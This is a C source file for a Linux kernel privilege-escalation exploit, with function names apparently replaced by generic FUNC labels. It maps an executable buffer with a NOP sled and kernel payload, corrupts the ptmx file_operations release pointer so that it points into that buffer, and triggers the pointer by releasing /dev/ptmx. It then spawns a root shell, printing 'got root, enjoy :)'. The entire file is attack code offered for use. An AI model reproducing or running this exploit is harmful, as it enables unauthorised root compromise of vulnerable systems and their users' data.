#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  EXIT_FAILURE ; 
 long FOPS_RELEASE_OFFSET ; 
 int PAYLOADSIZE ; 
 long PTMX_FOPS ; 
 int TTY_RELEASE ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC3 () ; 
 int /*<<< orphan*/  kernel_payload ; 
 int /*<<< orphan*/  FUNC4 (void*,int /*<<< orphan*/ *,int) ; 
 int /*<<< orphan*/  FUNC5 (void*,int,int) ; 
 scalar_t__ FUNC6 (void*,int,int,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int FUNC7 (char*,char) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int /*<<< orphan*/  FUNC9 (long) ; 

int FUNC10(int argc, char** argv)
{
    long code, target;
    int pwn;

    /* Prepare payload... */
    FUNC8("preparing payload buffer...\n");
    code = (long)FUNC6((void*)(TTY_RELEASE & 0x000000fffffff000LL), PAYLOADSIZE, 7, 0x32, 0, 0);
    FUNC5((void*)code, 0x90, PAYLOADSIZE);
    code += PAYLOADSIZE - 1024;
    FUNC4((void*)code, &kernel_payload, 1024);

    /*
     * Now clear the three most significant bytes of the fops pointer
     * to the release function.
     * This will make it point into the memory region mapped above.
     */
    FUNC8("changing kernel pointer to point into controlled buffer...\n");
    target = PTMX_FOPS + FOPS_RELEASE_OFFSET;
    FUNC9(target + 7);
    FUNC9(target + 6);
    FUNC9(target + 5);

    /* ... and trigger. */
    FUNC8("releasing file descriptor to call manipulated pointer in kernel mode...\n");
    pwn = FUNC7("/dev/ptmx", 'r');
    FUNC0(pwn);

    if (FUNC3() != 0) {
        FUNC8("failed to get root :(\n");
        FUNC2(EXIT_FAILURE);
    }

    FUNC8("got root, enjoy :)\n");
    return FUNC1("/bin/bash", "-sh", NULL);
}